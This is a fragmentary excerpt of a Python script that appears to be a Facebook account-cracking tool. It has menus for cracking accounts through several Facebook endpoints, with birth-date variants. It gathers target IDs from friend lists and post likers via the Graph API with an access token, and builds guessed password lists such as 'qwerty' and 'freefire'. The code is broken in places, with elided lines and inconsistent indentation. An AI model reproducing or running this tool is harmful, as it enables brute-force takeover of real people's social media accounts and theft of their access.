...
duration = str(datetime.now().strftime("%d-%m-%Y"))
year = current.year
month = current.month
day = current.day
...
def menu():
    ...
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your BD     : \033[1;32m"+ttl))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;32m"+duration))
    ...
    print((p+" ["+k+"06"+p+"]"+p+" Check Account Checkpoint Options "))
    print((p+" ["+k+"99"+p+"]"+p+" Results of Crack"))
...
def pilihcrack(file):
  ...
  print((p+" ["+k+"02"+p+"] Crack With Api.Facebook + BD "))
  print((p+" ["+k+"03"+p+"] Crack With Mbasic.Facebook"))
  print((p+" ["+k+"04"+p+"] Crack With Mbasic.Facebook + BD"))
  print((p+" ["+k+"05"+p+"] Crack With Touch.Facebook"))
  print((p+" ["+k+"06"+p+"] Crack With Touch.Facebook + BD "))
  print((p+" ["+k+"07"+p+"] Crack With M.Facebook "))
  print((p+" ["+k+"08"+p+"] Crack With M.Facebook + BD "))
  print((p+" ["+k+"09"+p+"] Crack With Free.Facebook "))
  print((p+" ["+k+"10"+p+"] Crack With Free.Facebook + BD "))
...
def publik():
	try:
		...
		logs()
	try:
		print((p+"\n ["+k+"•"+m+"•"+p+"] Type \'me\' To Collect From Friendlist"))
...
def likers():
	try:
		...
		logs()
	try:
		idt = input(p+" ["+k+"•"+m+"•"+p+"] Target Post Id: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+" ["+k+"•"+m+"•"+p+"] Name: "+op["name"]))
		...
		if len(i)<3:
			...
			if len(i)==3 or len(i)==4 or len(i)==5:
				...
				if "Singapore" in ips:
					...
					results.append("footfetish")
					results.append("qwerty")
					results.append("freefire")
					results.append("wahala")
					results.append("hukanawa")
	return results
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : ponnaya,qwerty,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
